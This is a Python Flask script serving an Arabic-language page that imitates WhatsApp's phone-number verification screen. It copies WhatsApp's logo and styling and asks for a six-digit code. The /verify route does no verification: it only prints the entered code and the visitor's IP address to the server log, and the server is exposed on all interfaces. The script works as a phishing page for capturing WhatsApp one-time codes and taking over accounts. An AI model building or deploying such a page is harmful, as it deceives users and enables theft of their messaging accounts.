from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من واتساب</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #111b21;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: #222e35;
            border-radius: 8px;
            padding: 40px 30px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }

        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 25px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo img {
            width: 100%;
            height: 100%;
        }

        h1 {
            color: #e9edef;
            font-size: 22px;
            margin-bottom: 10px;
            font-weight: 400;
        }

        .description {
            color: #8696a0;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .phone-number {
            color: #25d366;
            font-weight: 500;
        }

        .otp-input-group {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-bottom: 30px;
        }

        .otp-input {
            width: 45px;
            height: 50px;
            font-size: 24px;
            text-align: center;
            border: 2px solid #3b4a54;
            border-radius: 5px;
            background: #2a3942;
            color: #e9edef;
            outline: none;
            transition: all 0.3s;
            font-family: monospace;
        }

        .otp-input:focus {
            border-color: #25d366;
            background: #233338;
        }

        .verify-btn {
            width: 100%;
            padding: 12px;
            background: #25d366;
            color: #111b21;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-bottom: 15px;
        }

        .verify-btn:hover {
            background: #20bd5a;
        }

        .verify-btn:disabled {
            background: #3b4a54;
            color: #667781;
            cursor: not-allowed;
        }

        .resend-link {
            color: #00a884;
            text-decoration: none;
            font-size: 14px;
            cursor: pointer;
        }

        .resend-link:hover {
            text-decoration: underline;
        }

        .result {
            margin-top: 20px;
            padding: 15px;
            background: #233338;
            border-radius: 5px;
            border-right: 4px solid #25d366;
            display: none;
        }

        .result.show {
            display: block;
        }

        .result-title {
            color: #25d366;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 5px;
        }

        .result-code {
            color: #e9edef;
            font-size: 24px;
            font-family: monospace;
            letter-spacing: 3px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
        </div>
        <h1>التحقق من رقم هاتفك</h1>
        <p class="description">
            أدخل رمز التحقق المكون من 6 أرقام<br>
            المرسل إلى <span class="phone-number">+962 79 XXX XXXX</span>
        </p>

        <div class="otp-input-group">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
        </div>

        <button class="verify-btn" id="verifyBtn" disabled>تحقق من الرمز</button>
        
        <a href="#" class="resend-link">إعادة إرسال الرمز</a>

        <div class="result" id="result">
            <div class="result-title">الرمز المدخل:</div>
            <div class="result-code" id="otpCode"></div>
        </div>
    </div>

    <script>
        const inputs = document.querySelectorAll('.otp-input');
        const verifyBtn = document.getElementById('verifyBtn');
        const result = document.getElementById('result');
        const otpCode = document.getElementById('otpCode');

        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                const value = e.target.value;
                
                if (value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }

                checkComplete();
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });

            input.addEventListener('paste', (e) => {
                e.preventDefault();
                const pasteData = e.clipboardData.getData('text').slice(0, 6);
                
                pasteData.split('').forEach((char, i) => {
                    if (inputs[i] && /[0-9]/.test(char)) {
                        inputs[i].value = char;
                    }
                });

                checkComplete();
            });
        });

        function checkComplete() {
            const allFilled = Array.from(inputs).every(input => input.value.length === 1);
            verifyBtn.disabled = !allFilled;
        }

        verifyBtn.addEventListener('click', async () => {
            const otp = Array.from(inputs).map(input => input.value).join('');
            
            try {
                const response = await fetch('/verify', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ otp: otp })
                });

                const data = await response.json();
                
                otpCode.textContent = data.otp;
                result.classList.add('show');
                
            } catch (error) {
                console.error('Error:', error);
            }
        });

        inputs[0].focus();
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/verify', methods=['POST'])
def verify():
    data = request.get_json()
    otp = data.get('otp', '')
    
    print(f"✅ OTP المدخل: {otp}")
    print(f"📱 تم إدخال الرمز في: {request.remote_addr}")
    
    return jsonify({'status': 'success', 'otp': otp})

if __name__ == '__main__':
    print("🚀 السيرفر شغال على: http://127.0.0.1:5000")
    print("📝 الـ OTP رح ينطبع هون بالـ log\n")
    app.run(debug=True, host='0.0.0.0', port=5000)